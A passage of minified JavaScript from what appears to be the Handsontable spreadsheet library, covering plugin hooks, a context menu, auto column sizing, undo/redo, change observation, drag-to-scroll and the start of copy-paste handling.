t={add:function(e,t){e[t]=this.value;return true},remove:function(e,t){delete e[t];return true},replace:function(e,t){e[t]=this.value;return true},move:function(e,t,n){var r={op:"_get",path:this.from};E(n,[r]);E(n,[{op:"remove",path:this.from}]);E(n,[{op:"add",path:this.path,value:r.value}]);return true},copy:function(e,t,n){var r={op:"_get",path:this.from};E(n,[r]);E(n,[{op:"add",path:this.path,value:r.value}]);return true},test:function(e,t){return JSON.stringify(e[t])===JSON.stringify(this.value)},_get:function(e,t){this.value=e[t]}};var n={add:function(e,t){e.splice(t,0,this.value);return true},remove:function(e,t){e.splice(t,1);return true},replace:function(e,t){e[t]=this.value;return true},move:t.move,copy:t.copy,test:t.test,_get:t._get};var r={add:function(e,t){var n={op:"add",path:t+i(this.name),value:this.object[this.name]};e.push(n)},"delete":function(e,t){var n={op:"remove",path:t+i(this.name)};e.push(n)},update:function(e,t){var n={op:"replace",path:t+i(this.name),value:this.object[this.name]};e.push(n)}};var u=[];e.intervals;var a=function(){function e(e){this.observers=[];this.obj=e}return e}();var f=function(){function e(e,t){this.callback=e;this.observer=t}return e}();e.unobserve=p;e.observe=d;e.generate=g;var y;if(Object.keys){y=Object.keys}else{y=function(e){var t=[];for(var n in e){if(e.hasOwnProperty(n)){t.push(n)}}return t}}var w;if(Array.isArray){w=Array.isArray}else{w=function(e){return e.push&&typeof e.length==="number"}}e.apply=E})(jsonpatch||(jsonpatch={}));if(typeof exports!=="undefined"){exports.apply=jsonpatch.apply;exports.observe=jsonpatch.observe;exports.unobserve=jsonpatch.unobserve;exports.generate=jsonpatch.generate}Handsontable.PluginHookClass=function(){function n(){this.hooks=e();this.legacy=t}var e=function(){return{beforeInitWalkontable:[],beforeInit:[],beforeRender:[],beforeChange:[],beforeRemoveCol:[],beforeRemoveRow:[],beforeValidate:[],beforeGet:[],beforeSet:[],beforeGetCellMeta:[],beforeAutofill:[],beforeKeyDown:[],beforeColumnSort:[],afterInit:[],afterLoadData:[],afterUpdateSettings:[],afterRender:[],afterRenderer:[],afterChange:[],afterValidate:[],afterGetCellMeta:[],afterGetColHeader:[],afterGetColWidth:[],afterDestroy:[],afterRemoveRow:[],afterCreateRow:[],afterRemoveCol:[],afterCreateCol:[],afterColumnResize:[],afterColumnMove:[],afterColumnSort:[],afterDeselect:[],afterSelection:[],afterSelectionByProp:[],afterSelectionEnd:[],afterSelectionEndByProp:[],afterCopyLimit:[],afterOnCellMouseDown:[],afterOnCellMouseOver:[],afterOnCellCornerMouseDown:[],afterScrollVertically:[],afterScrollHorizontally:[],modifyCol:[]}};var t={onBeforeChange:"beforeChange",onChange:"afterChange",onCreateRow:"afterCreateRow",onCreateCol:"afterCreateCol",onSelection:"afterSelection",onCopyLimit:"afterCopyLimit",onSelectionEnd:"afterSelectionEnd",onSelectionByProp:"afterSelectionByProp",onSelectionEndByProp:"afterSelectionEndByProp"};n.prototype.add=function(e,n){if(Handsontable.helper.isArray(n)){for(var r=0,i=n.length;r<i;r++){this.add(e,n[r])}}else{if(e in t){e=t[e]}if(typeof this.hooks[e]==="undefined"){this.hooks[e]=[]}if(this.hooks[e].indexOf(n)==-1){this.hooks[e].push(n)}}return this};n.prototype.once=function(e,t){if(Handsontable.helper.isArray(t)){for(var n=0,r=t.length;n<r;n++){t[n].runOnce=true;this.add(e,t[n])}}else{t.runOnce=true;this.add(e,t)}};n.prototype.remove=function(e,n){var r=false;if(e in t){e=t[e]}if(typeof this.hooks[e]!=="undefined"){for(var i=0,s=this.hooks[e].length;i<s;i++){if(this.hooks[e][i]==n){delete this.hooks[e][i].runOnce;this.hooks[e].splice(i,1);r=true;break}}}return r};n.prototype.run=function(e,n,r,i,s,o,u){if(n in t){n=t[n]}if(typeof this.hooks[n]!=="undefined"){var a=Array.prototype.slice.call(this.hooks[n]);for(var f=0,l=a.length;f<l;f++){a[f].call(e,r,i,s,o,u);if(a[f].runOnce){this.remove(n,a[f])}}}};n.prototype.execute=function(e,n,r,i,s,o,u){var a,f;if(n in t){n=t[n]}if(typeof this.hooks[n]!=="undefined"){f=Array.prototype.slice.call(this.hooks[n]);for(var l=0,c=f.length;l<c;l++){a=f[l].call(e,r,i,s,o,u);if(a!==void 0){r=a}if(f[l].runOnce){this.remove(n,f[l])}if(a===false){return false}}}return r};return n}();Handsontable.PluginHooks=new Handsontable.PluginHookClass;(function(e){function t(){function i(e){var t=document,n=this;n.table=t.createElement("table");n.theadTh=t.createElement("th");n.table.appendChild(t.createElement("thead")).appendChild(t.createElement("tr")).appendChild(n.theadTh);n.tableStyle=n.table.style;n.tableStyle.tableLayout="auto";n.tableStyle.width="auto";n.tbody=t.createElement("tbody");n.table.appendChild(n.tbody);n.container=t.createElement("div");n.container.className=e.rootElement[0].className+" hidden";n.containerStyle=n.container.style;n.container.appendChild(n.table)}var t=this,r=5;this.beforeInit=function(){var e=this;e.autoColumnWidths=[];if(e.getSettings().autoColumnSize!==false){if(!e.autoColumnSizeTmp){e.autoColumnSizeTmp={table:null,tableStyle:null,theadTh:null,tbody:null,container:null,containerStyle:null,determineBeforeNextRender:true};e.addHook("beforeRender",n.determineIfChanged);e.addHook("afterGetColWidth",n.getColWidth);e.addHook("afterDestroy",n.afterDestroy);e.determineColumnWidth=t.determineColumnWidth}}else{if(e.autoColumnSizeTmp){e.removeHook("beforeRender",n.determineIfChanged);e.removeHook("afterGetColWidth",n.getColWidth);e.removeHook("afterDestroy",n.afterDestroy);delete e.determineColumnWidth;t.afterDestroy.call(e)}}};this.determineIfChanged=function(e){if(e){n.determineColumnsWidth.apply(this,arguments)}};this.determineColumnWidth=function(t){var n=this,s=n.autoColumnSizeTmp;if(!s.container){i.call(s,n)}s.container.className=n.rootElement[0].className+" htAutoColumnSize";s.table.className=n.$table[0].className;var o=n.countRows();var u={};var a=0;for(var f=0;f<o;f++){var l=e.helper.stringify(n.getDataAtCell(f,t));var c=l.length;if(c>a){a=c}if(!u[c]){u[c]={needed:r,strings:[]}}if(u[c].needed){u[c].strings.push({value:l,row:f});u[c].needed--}}var h=n.getSettings();if(h.colHeaders){n.view.appendColHeader(t,s.theadTh)}n.view.wt.wtDom.empty(s.tbody);for(var p in u){if(u.hasOwnProperty(p)){for(var d=0,v=u[p].strings.length;d<v;d++){var m=u[p].strings[d].row;var g=n.getCellMeta(m,t);g.col=t;g.row=m;var y=n.getCellRenderer(g);var b=document.createElement("tr");var w=document.createElement("td");y(n,w,m,t,n.colToProp(t),u[p].strings[d].value,g);f++;b.appendChild(w);s.tbody.appendChild(b)}}}var E=n.rootElement[0].parentNode;E.appendChild(s.container);var S=n.view.wt.wtDom.outerWidth(s.table);E.removeChild(s.container);if(!h.nativeScrollbars){var x=n.view.wt.wtViewport.getViewportWidth()-2;if(S>x){S=x}}return S};this.determineColumnsWidth=function(){var e=this;var n=this.getSettings();if(n.autoColumnSize||!n.colWidths){var r=this.countCols();for(var i=0;i<r;i++){if(!e._getColWidthFromSettings(i)){this.autoColumnWidths[i]=t.determineColumnWidth.call(e,i)}}}};this.getColWidth=function(e,t){if(this.autoColumnWidths[e]&&this.autoColumnWidths[e]>t.width){t.width=this.autoColumnWidths[e]}};this.afterDestroy=function(){var e=this;if(e.autoColumnSizeTmp&&e.autoColumnSizeTmp.container&&e.autoColumnSizeTmp.container.parentNode){e.autoColumnSizeTmp.container.parentNode.removeChild(e.autoColumnSizeTmp.container)}e.autoColumnSizeTmp=null}}var n=new t;e.PluginHooks.add("beforeInit",n.beforeInit);e.PluginHooks.add("afterUpdateSettings",n.beforeInit)})(Handsontable);var htSortColumn=new HandsontableColumnSorting;Handsontable.PluginHooks.add("afterInit",function(){htSortColumn.init.call(this,"afterInit")});Handsontable.PluginHooks.add("afterUpdateSettings",function(){htSortColumn.init.call(this,"afterUpdateSettings")});Handsontable.PluginHooks.add("beforeGet",htSortColumn.onBeforeGetSet);Handsontable.PluginHooks.add("beforeSet",htSortColumn.onBeforeGetSet);Handsontable.PluginHooks.add("afterGetColHeader",htSortColumn.getColHeader);(function(e){"use strict";function t(n,r){function s(){var t=$("body > .htContextMenu")[0];if(!t){t=document.createElement("DIV");e.Dom.addClass(t,"htContextMenu");document.getElementsByTagName("body")[0].appendChild(t)}return t}this.instance=n;var i=this;this.menu=s();this.enabled=true;this.bindMouseEvents();this.bindTableEvents();this.instance.addHook("afterDestroy",function(){i.destroy()});this.defaultOptions={items:{row_above:{name:"Insert row above",callback:function(e,t){this.alter("insert_row",t.start.row())},disabled:function(){return this.countRows()>=this.getSettings().maxRows}},row_below:{name:"Insert row below",callback:function(e,t){this.alter("insert_row",t.end.row()+1)},disabled:function(){return this.countRows()>=this.getSettings().maxRows}},hsep1:t.SEPARATOR,col_left:{name:"Insert column on the left",callback:function(e,t){this.alter("insert_col",t.start.col())},disabled:function(){return this.countCols()>=this.getSettings().maxCols}},col_right:{name:"Insert column on the right",callback:function(e,t){this.alter("insert_col",t.end.col()+1)},disabled:function(){return this.countCols()>=this.getSettings().maxCols}},hsep2:t.SEPARATOR,remove_row:{name:"Remove row",callback:function(e,t){var n=t.end.row()-t.start.row()+1;this.alter("remove_row",t.start.row(),n)}},remove_col:{name:"Remove column",callback:function(e,t){var n=t.end.col()-t.start.col()+1;this.alter("remove_col",t.start.col(),n)}},hsep3:t.SEPARATOR,undo:{name:"Undo",callback:function(){this.undo()},disabled:function(){return this.undoRedo&&!this.undoRedo.isUndoAvailable()}},redo:{name:"Redo",callback:function(){this.redo()},disabled:function(){return this.undoRedo&&!this.undoRedo.isRedoAvailable()}}}};this.options={};e.helper.extend(this.options,this.defaultOptions);this.updateOptions(r)}function n(){var n=this;var r=n.getSettings().contextMenu;var i=e.helper.isObject(r)?r:{};if(r){if(!n.contextMenu){n.contextMenu=new t(n,i)}n.contextMenu.enable();if(e.helper.isArray(r)){n.contextMenu.filterItems(r)}}else if(n.contextMenu){n.contextMenu.destroy();delete n.contextMenu}}t.prototype.bindMouseEvents=function(){function n(n){n.preventDefault();if(n.target.nodeName!="TD"&&!(e.Dom.hasClass(n.target,"current")&&e.Dom.hasClass(n.target,"wtBorder"))){return}this.show(n.pageY,n.pageX);$(document).on("mousedown.htContextMenu",e.helper.proxy(t.prototype.close,this))}this.instance.rootElement.on("contextmenu.htContextMenu",e.helper.proxy(n,this))};t.prototype.bindTableEvents=function(){var e=this;this._afterScrollCallback=function(){e.close()};this.instance.addHook("afterScrollVertically",this._afterScrollCallback);this.instance.addHook("afterScrollHorizontally",this._afterScrollCallback)};t.prototype.unbindTableEvents=function(){var e=this;if(this._afterScrollCallback){this.instance.removeHook("afterScrollVertically",this._afterScrollCallback);this.instance.removeHook("afterScrollHorizontally",this._afterScrollCallback);this._afterScrollCallback=null}};t.prototype.performAction=function(){var e=$(this.menu).handsontable("getInstance");var n=e.getSelected()[0];var r=e.getData()[n];if(r.disabled===true||typeof r.disabled=="function"&&r.disabled.call(this.instance)===true){return}if(typeof r.callback!="function"){return}var i=this.instance.getSelected();var s=t.utils.normalizeSelection(i);r.callback.call(this.instance,r.key,s)};t.prototype.unbindMouseEvents=function(){this.instance.rootElement.off("contextmenu.htContextMenu");$(document).off("mousedown.htContextMenu")};t.prototype.show=function(n,r){this.menu.style.display="block";$(this.menu).off("mousedown.htContextMenu").on("mousedown.htContextMenu",e.helper.proxy(this.performAction,this));$(this.menu).handsontable({data:t.utils.convertItemsToArray(this.getItems()),colHeaders:false,colWidths:[160],readOnly:true,copyPaste:false,columns:[{data:"name",renderer:e.helper.proxy(this.renderer,this)}],beforeKeyDown:e.helper.proxy(this.onBeforeKeyDown,this)});this.bindTableEvents();this.setMenuPosition(n,r);$(this.menu).handsontable("listen")};t.prototype.close=function(){this.hide();$(document).off("mousedown.htContextMenu");this.unbindTableEvents();this.instance.listen()};t.prototype.hide=function(){this.menu.style.display="none";$(this.menu).handsontable("destroy")};t.prototype.renderer=function(n,r,i,s,o,u,a){function h(e){return(new RegExp(t.SEPARATOR,"i")).test(e.name)}function p(e,t){return e.disabled===true||typeof e.disabled=="function"&&e.disabled.call(f.instance)===true}var f=this;var l=n.getData()[i];var c=document.createElement("DIV");e.Dom.empty(r);r.appendChild(c);if(h(l)){e.Dom.addClass(r,"htSeparator")}else{e.Dom.fastInnerText(c,u)}if(p(l,f.instance)){e.Dom.addClass(r,"htDisabled");$(c).on("mouseenter",function(){n.deselectCell()})}else{e.Dom.removeClass(r,"htDisabled");$(c).on("mouseenter",function(){n.selectCell(i,s)})}};t.prototype.onBeforeKeyDown=function(n){function o(e){var n=e.getCell(0,0);if(t.utils.isSeparator(n)||t.utils.isDisabled(n)){a(0,0,e)}else{e.selectCell(0,0)}}function u(e){var n=e.countRows()-1;var r=e.getCell(n,0);if(t.utils.isSeparator(r)||t.utils.isDisabled(r)){f(n,0,e)}else{e.selectCell(n,0)}}function a(e,n,r){var i=e+1;var s=i<r.countRows()?r.getCell(i,n):null;if(!s){return}if(t.utils.isSeparator(s)||t.utils.isDisabled(s)){a(i,n,r)}else{r.selectCell(i,n)}}function f(e,n,r){var i=e-1;var s=i>=0?r.getCell(i,n):null;if(!s){return}if(t.utils.isSeparator(s)||t.utils.isDisabled(s)){f(i,n,r)}else{r.selectCell(i,n)}}var r=this;var i=$(r.menu).handsontable("getInstance");var s=i.getSelected();switch(n.keyCode){case e.helper.keyCode.ESCAPE:r.close();n.preventDefault();n.stopImmediatePropagation();break;case e.helper.keyCode.ENTER:if(i.getSelected()){r.performAction();r.close()}break;case e.helper.keyCode.ARROW_DOWN:if(!s){o(i)}else{a(s[0],s[1],i)}n.preventDefault();n.stopImmediatePropagation();break;case e.helper.keyCode.ARROW_UP:if(!s){u(i)}else{f(s[0],s[1],i)}n.preventDefault();n.stopImmediatePropagation();break}};t.prototype.getItems=function(){function n(t){if(typeof t=="string"){this.name=t}else{e.helper.extend(this,t)}}var t={};n.prototype=this.options;for(var r in this.options.items){if(this.options.items.hasOwnProperty(r)&&(!this.itemsFilter||this.itemsFilter.indexOf(r)!=-1)){t[r]=new n(this.options.items[r])}}return t};t.prototype.updateOptions=function(t){t=t||{};if(t.items){for(var n in t.items){var r={};if(t.items.hasOwnProperty(n)){if(this.defaultOptions.items.hasOwnProperty(n)&&e.helper.isObject(t.items[n])){e.helper.extend(r,this.defaultOptions.items[n]);e.helper.extend(r,t.items[n]);t.items[n]=r}}}}e.helper.extend(this.options,t)};t.prototype.setMenuPosition=function(e,t){var n={top:e,topRelative:e-document.documentElement.scrollTop,left:t,leftRelative:t-document.documentElement.scrollLeft};if(this.menuFitsBelowCursor(n)){this.positionMenuBelowCursor(n)}else{this.positionMenuAboveCursor(n)}if(this.menuFitsOnRightOfCursor(n)){this.positionMenuOnRightOfCursor(n)}else{this.positionMenuOnLeftOfCursor(n)}};t.prototype.menuFitsBelowCursor=function(e){return e.topRelative+this.menu.offsetHeight<=document.documentElement.scrollTop+document.documentElement.clientHeight};t.prototype.menuFitsOnRightOfCursor=function(e){return e.leftRelative+this.menu.offsetWidth<=document.documentElement.scrollLeft+document.documentElement.clientWidth};t.prototype.positionMenuBelowCursor=function(e){this.menu.style.top=e.top+"px"};t.prototype.positionMenuAboveCursor=function(e){this.menu.style.top=e.top-this.menu.offsetHeight+"px"};t.prototype.positionMenuOnRightOfCursor=function(e){this.menu.style.left=e.left+"px"};t.prototype.positionMenuOnLeftOfCursor=function(e){this.menu.style.left=e.left-this.menu.offsetWidth+"px"};t.utils={};t.utils.convertItemsToArray=function(e){var t=[];var n;for(var r in e){if(e.hasOwnProperty(r)){if(typeof e[r]=="string"){n={name:e[r]}}else if(e[r].visible!==false){n=e[r]}else{continue}n.key=r;t.push(n)}}return t};t.utils.normalizeSelection=function(t){var n={start:new e.SelectionPoint,end:new e.SelectionPoint};n.start.row(Math.min(t[0],t[2]));n.start.col(Math.min(t[1],t[3]));n.end.row(Math.max(t[0],t[2]));n.end.col(Math.max(t[1],t[3]));return n};t.utils.isSeparator=function(t){return e.Dom.hasClass(t,"htSeparator")};t.utils.isDisabled=function(t){return e.Dom.hasClass(t,"htDisabled")};t.prototype.enable=function(){if(!this.enabled){this.enabled=true;this.bindMouseEvents()}};t.prototype.disable=function(){if(this.enabled){this.enabled=false;this.close();this.unbindMouseEvents();this.unbindTableEvents()}};t.prototype.destroy=function(){this.close();this.unbindMouseEvents();this.unbindTableEvents();if(!this.isMenuEnabledByOtherHotInstance()){this.removeMenu()}};t.prototype.isMenuEnabledByOtherHotInstance=function(){var e=$(".handsontable");var t=false;for(var n=0,r=e.length;n<r;n++){var i=$(e[n]).handsontable("getInstance");if(i&&i.getSettings().contextMenu){t=true;break}}return t};t.prototype.removeMenu=function(){if(this.menu.parentNode){this.menu.parentNode.removeChild(this.menu)}};t.prototype.filterItems=function(e){this.itemsFilter=e};t.SEPARATOR="---------";e.PluginHooks.add("afterInit",n);e.PluginHooks.add("afterUpdateSettings",n);e.ContextMenu=t})(Handsontable);Handsontable.PluginHooks.add("beforeGetCellMeta",function(e,t,n){n.isWritable=!n.readOnly;if(n.autoComplete){throw new Error("Support for legacy autocomplete syntax was removed in Handsontable 0.10.0. Please remove the property named 'autoComplete' from your config. For replacement instructions, see wiki page https://github.com/warpech/jquery-handsontable/wiki/Migration-guide-to-0.10.x")}});var htManualColumnMove=new HandsontableManualColumnMove;Handsontable.PluginHooks.add("beforeInit",htManualColumnMove.beforeInit);Handsontable.PluginHooks.add("afterInit",function(){htManualColumnMove.init.call(this,"afterInit")});Handsontable.PluginHooks.add("afterUpdateSettings",function(){htManualColumnMove.init.call(this,"afterUpdateSettings")});Handsontable.PluginHooks.add("afterGetColHeader",htManualColumnMove.getColHeader);Handsontable.PluginHooks.add("modifyCol",htManualColumnMove.modifyCol);var htManualColumnResize=new HandsontableManualColumnResize;Handsontable.PluginHooks.add("beforeInit",htManualColumnResize.beforeInit);Handsontable.PluginHooks.add("afterInit",function(){htManualColumnResize.init.call(this,"afterInit")});Handsontable.PluginHooks.add("afterUpdateSettings",function(){htManualColumnResize.init.call(this,"afterUpdateSettings")});Handsontable.PluginHooks.add("afterGetColWidth",htManualColumnResize.getColWidth);(function(){function t(){var e=this;var t=e.getSettings().observeChanges;if(t){if(e.observer){i.call(e)}n.call(e);o.call(e)}else if(!t){i.call(e)}}function n(){var e=this;e.observeChangesActive=true;e.pauseObservingChanges=function(){e.observeChangesActive=false};e.resumeObservingChanges=function(){e.observeChangesActive=true};e.observedData=e.getData();e.observer=jsonpatch.observe(e.observedData,function(t){if(e.observeChangesActive){r.call(e,t);e.render()}e.runHooks("afterChangesObserved")})}function r(e){function u(e){var t;t=f(e);t=a(t);return t}function a(e){var t=[];return e.filter(function(e){var n=l(e.path);if(["add","remove"].indexOf(e.op)!=-1&&!isNaN(n.col)){if(t.indexOf(n.col)!=-1){return false}else{t.push(n.col)}}return true})}function f(e){return e.filter(function(e){return!/[/]length/ig.test(e.path)})}function l(e){var t=e.match(/^\/(\d+)\/?(.*)?$/);return{row:parseInt(t[1],10),col:/^\d*$/.test(t[2])?parseInt(t[2],10):t[2]}}var t=this;var n=u(e);for(var r=0,i=n.length;r<i;r++){var s=n[r];var o=l(s.path);switch(s.op){case"add":if(isNaN(o.col)){t.runHooks("afterCreateRow",o.row)}else{t.runHooks("afterCreateCol",o.col)}break;case"remove":if(isNaN(o.col)){t.runHooks("afterRemoveRow",o.row,1)}else{t.runHooks("afterRemoveCol",o.col,1)}break;case"replace":t.runHooks("afterChange",[o.row,o.col,null,s.value],"external");break}}}function i(){var e=this;if(e.observer){s.call(e);u.call(e)}}function s(){var e=this;jsonpatch.unobserve(e.observedData,e.observer);delete e.observeChangesActive;delete e.pauseObservingChanges;delete e.resumeObservingChanges}function o(){var e=this;e.addHook("afterDestroy",i);e.addHook("afterCreateRow",a);e.addHook("afterRemoveRow",a);e.addHook("afterCreateCol",a);e.addHook("afterRemoveCol",a);e.addHook("afterChange",function(e,t){if(t!="loadData"){a.call(this)}})}function u(){var e=this;e.removeHook("afterDestroy",i);e.removeHook("afterCreateRow",a);e.removeHook("afterRemoveRow",a);e.removeHook("afterCreateCol",a);e.removeHook("afterRemoveCol",a);e.removeHook("afterChange",a)}function a(){var e=this;e.pauseObservingChanges();e.addHookOnce("afterChangesObserved",function(){e.resumeObservingChanges()})}Handsontable.PluginHooks.add("afterLoadData",t);Handsontable.PluginHooks.add("afterUpdateSettings",t)})();(function(e){function t(){function r(){var e=this;for(var t in n){if(n.hasOwnProperty(t)&&!s.call(e,t)){e.PluginHooks.add(t,n[t])}}}function i(){var e=this;for(var t in n){if(n.hasOwnProperty(t)&&s.call(e,t)){e.PluginHooks.remove(t,n[t])}}}function s(e){var t=this;return t.PluginHooks.hooks.hasOwnProperty(e)}var t=this;this.init=function(){var n=this,s=n.getSettings()["persistentState"];t.enabled=!!s;if(!t.enabled){i.call(n);return}if(!n.storage){n.storage=new e(n.rootElement[0].id)}n.resetState=t.resetValue;r.call(n)};this.saveValue=function(e,t){var n=this;n.storage.saveValue(e,t)};this.loadValue=function(e,t){var n=this;t.value=n.storage.loadValue(e)};this.resetValue=function(e){var t=this;if(typeof e!="undefined"){t.storage.reset(e)}else{t.storage.resetAll()}};var n={persistentStateSave:t.saveValue,persistentStateLoad:t.loadValue,persistentStateReset:t.resetValue}}var n=new t;Handsontable.PluginHooks.add("beforeInit",n.init);Handsontable.PluginHooks.add("afterUpdateSettings",n.init)})(Storage);(function(e){e.UndoRedo=function(t){var n=this;this.instance=t;this.doneActions=[];this.undoneActions=[];this.ignoreNewActions=false;t.addHook("afterChange",function(t,r){if(t){if(r!=="undo"&&r!=="redo"){var i=new e.UndoRedo.ChangeAction(t);n.done(i)}}});t.addHook("afterCreateRow",function(t,r,i){if(i){return}var s=new e.UndoRedo.CreateRowAction(t,r);n.done(s)});t.addHook("beforeRemoveRow",function(t,r){var i=n.instance.getData();t=(i.length+t)%i.length;var s=i.slice(t,t+r);var o=new e.UndoRedo.RemoveRowAction(t,s);n.done(o)});t.addHook("afterCreateCol",function(t,r,i){if(i){return}var s=new e.UndoRedo.CreateColumnAction(t,r);n.done(s)});t.addHook("beforeRemoveCol",function(r,i){var s=n.instance.getData();r=(n.instance.countCols()+r)%n.instance.countCols();var o=[];for(var u=0,a=s.length;u<a;u++){o[u]=s[u].slice(r,r+i)}var f;if(e.helper.isArray(t.getSettings().colHeaders)){f=t.getSettings().colHeaders.slice(r,r+o.length)}var l=new e.UndoRedo.RemoveColumnAction(r,o,f);n.done(l)})};e.UndoRedo.prototype.done=function(e){if(!this.ignoreNewActions){this.doneActions.push(e);this.undoneActions.length=0}};e.UndoRedo.prototype.undo=function(){if(this.isUndoAvailable()){var e=this.doneActions.pop();this.ignoreNewActions=true;var t=this;e.undo(this.instance,function(){t.ignoreNewActions=false;t.undoneActions.push(e)})}};e.UndoRedo.prototype.redo=function(){if(this.isRedoAvailable()){var e=this.undoneActions.pop();this.ignoreNewActions=true;var t=this;e.redo(this.instance,function(){t.ignoreNewActions=false;t.doneActions.push(e)})}};e.UndoRedo.prototype.isUndoAvailable=function(){return this.doneActions.length>0};e.UndoRedo.prototype.isRedoAvailable=function(){return this.undoneActions.length>0};e.UndoRedo.prototype.clear=function(){this.doneActions.length=0;this.undoneActions.length=0};e.UndoRedo.Action=function(){};e.UndoRedo.Action.prototype.undo=function(){};e.UndoRedo.Action.prototype.redo=function(){};e.UndoRedo.ChangeAction=function(e){this.changes=e};e.helper.inherit(e.UndoRedo.ChangeAction,e.UndoRedo.Action);e.UndoRedo.ChangeAction.prototype.undo=function(e,t){var n=$.extend(true,[],this.changes);for(var r=0,i=n.length;r<i;r++){n[r].splice(3,1)}e.addHookOnce("afterChange",t);e.setDataAtRowProp(n,null,null,"undo")};e.UndoRedo.ChangeAction.prototype.redo=function(e,t){var n=$.extend(true,[],this.changes);for(var r=0,i=n.length;r<i;r++){n[r].splice(2,1)}e.addHookOnce("afterChange",t);e.setDataAtRowProp(n,null,null,"redo")};e.UndoRedo.CreateRowAction=function(e,t){this.index=e;this.amount=t};e.helper.inherit(e.UndoRedo.CreateRowAction,e.UndoRedo.Action);e.UndoRedo.CreateRowAction.prototype.undo=function(e,t){e.addHookOnce("afterRemoveRow",t);e.alter("remove_row",this.index,this.amount)};e.UndoRedo.CreateRowAction.prototype.redo=function(e,t){e.addHookOnce("afterCreateRow",t);e.alter("insert_row",this.index+1,this.amount)};e.UndoRedo.RemoveRowAction=function(e,t){this.index=e;this.data=t};e.helper.inherit(e.UndoRedo.RemoveRowAction,e.UndoRedo.Action);e.UndoRedo.RemoveRowAction.prototype.undo=function(e,t){var n=[this.index,0];Array.prototype.push.apply(n,this.data);Array.prototype.splice.apply(e.getData(),n);e.addHookOnce("afterRender",t);e.render()};e.UndoRedo.RemoveRowAction.prototype.redo=function(e,t){e.addHookOnce("afterRemoveRow",t);e.alter("remove_row",this.index,this.data.length)};e.UndoRedo.CreateColumnAction=function(e,t){this.index=e;this.amount=t};e.helper.inherit(e.UndoRedo.CreateColumnAction,e.UndoRedo.Action);e.UndoRedo.CreateColumnAction.prototype.undo=function(e,t){e.addHookOnce("afterRemoveCol",t);e.alter("remove_col",this.index,this.amount)};e.UndoRedo.CreateColumnAction.prototype.redo=function(e,t){e.addHookOnce("afterCreateCol",t);e.alter("insert_col",this.index+1,this.amount)};e.UndoRedo.RemoveColumnAction=function(e,t,n){this.index=e;this.data=t;this.amount=this.data[0].length;this.headers=n};e.helper.inherit(e.UndoRedo.RemoveColumnAction,e.UndoRedo.Action);e.UndoRedo.RemoveColumnAction.prototype.undo=function(e,t){var n,r;for(var i=0,s=e.getData().length;i<s;i++){n=e.getDataAtRow(i);r=[this.index,0];Array.prototype.push.apply(r,this.data[i]);Array.prototype.splice.apply(n,r)}if(typeof this.headers!="undefined"){r=[this.index,0];Array.prototype.push.apply(r,this.headers);Array.prototype.splice.apply(e.getSettings().colHeaders,r)}e.addHookOnce("afterRender",t);e.render()};e.UndoRedo.RemoveColumnAction.prototype.redo=function(e,t){e.addHookOnce("afterRemoveCol",t);e.alter("remove_col",this.index,this.amount)}})(Handsontable);(function(e){function t(){var t=this;var o=typeof t.getSettings().undo=="undefined"||t.getSettings().undo;if(o){if(!t.undoRedo){t.undoRedo=new e.UndoRedo(t);i(t);t.addHook("beforeKeyDown",n);t.addHook("afterChange",r)}}else{if(t.undoRedo){delete t.undoRedo;s(t);t.removeHook("beforeKeyDown",n);t.removeHook("afterChange",r)}}}function n(e){var t=this;var n=(e.ctrlKey||e.metaKey)&&!e.altKey;if(n){if(e.keyCode===89||e.shiftKey&&e.keyCode===90){t.undoRedo.redo();e.stopImmediatePropagation()}else if(e.keyCode===90){t.undoRedo.undo();e.stopImmediatePropagation()}}}function r(e,t){var n=this;if(t=="loadData"){return n.undoRedo.clear()}}function i(e){e.undo=function(){return e.undoRedo.undo()};e.redo=function(){return e.undoRedo.redo()};e.isUndoAvailable=function(){return e.undoRedo.isUndoAvailable()};e.isRedoAvailable=function(){return e.undoRedo.isRedoAvailable()};e.clearUndo=function(){return e.undoRedo.clear()}}function s(e){delete e.undo;delete e.redo;delete e.isUndoAvailable;delete e.isRedoAvailable;delete e.clearUndo}e.PluginHooks.add("afterInit",t);e.PluginHooks.add("afterUpdateSettings",t)})(Handsontable);DragToScroll.prototype.setBoundaries=function(e){this.boundaries=e};DragToScroll.prototype.setCallback=function(e){this.callback=e};DragToScroll.prototype.check=function(e,t){var n=0;var r=0;if(t<this.boundaries.top){r=t-this.boundaries.top}else if(t>this.boundaries.bottom){r=t-this.boundaries.bottom}if(e<this.boundaries.left){n=e-this.boundaries.left}else if(e>this.boundaries.right){n=e-this.boundaries.right}this.callback(n,r)};var listening=false;var dragToScroll;var instance;if(typeof Handsontable!=="undefined"){var setupListening=function(e){var t=e.view.wt.wtScrollbars.vertical.scrollHandler;dragToScroll=new DragToScroll;if(t===window){return}else if(t){dragToScroll.setBoundaries(t.getBoundingClientRect())}else{dragToScroll.setBoundaries(e.$table[0].getBoundingClientRect())}dragToScroll.setCallback(function(n,r){if(n<0){if(t){t.scrollLeft-=50}else{e.view.wt.scrollHorizontal(-1).draw()}}else if(n>0){if(t){t.scrollLeft+=50}else{e.view.wt.scrollHorizontal(1).draw()}}if(r<0){if(t){t.scrollTop-=20}else{e.view.wt.scrollVertical(-1).draw()}}else if(r>0){if(t){t.scrollTop+=20}else{e.view.wt.scrollVertical(1).draw()}}});listening=true};Handsontable.PluginHooks.add("afterInit",function(){$(document).on("mouseup."+this.guid,function(){listening=false});$(document).on("mousemove."+this.guid,function(e){if(listening){dragToScroll.check(e.clientX,e.clientY)}})});Handsontable.PluginHooks.add("destroy",function(){$(document).off("."+this.guid)});Handsontable.PluginHooks.add("afterOnCellMouseDown",function(){setupListening(this)});Handsontable.PluginHooks.add("afterOnCellCornerMouseDown",function(){setupListening(this)});Handsontable.plugins.DragToScroll=DragToScroll}(function(e,t,n){function r(r){function s(){if(!r.isListening()){return}r.selection.empty()}function o(e){if(!r.isListening()||!r.selection.isSelected()){return}var t=e.replace(/^[\r\n]*/g,"").replace(/[\r\n]*$/g,""),i=n.parse(t),s=r.getSelected(),o=r.getCornerCoords([{row:s[0],col:s[1]},{row:s[2],col:s[3]}]),u=o.TL,a={row:Math.max(o.BR.row,i.length-1+o.TL.row),col:Math.max(o.BR.col,i[0].length-1+o.TL.col)};r.PluginHooks.once("afterChange",function(e,t){if(e&&e.length){this.selectCell(u.row,u.col,a.row,a.col)}});r.populateFromArray(u.row,u.col,i,a.row,a.col,"paste",r.getSettings().pasteMode)}function u(t){if(e.helper.isCtrlKey(t.keyCode)&&r.getSelected()){i.setCopyableText();t.stopImmediatePropagation();return}var 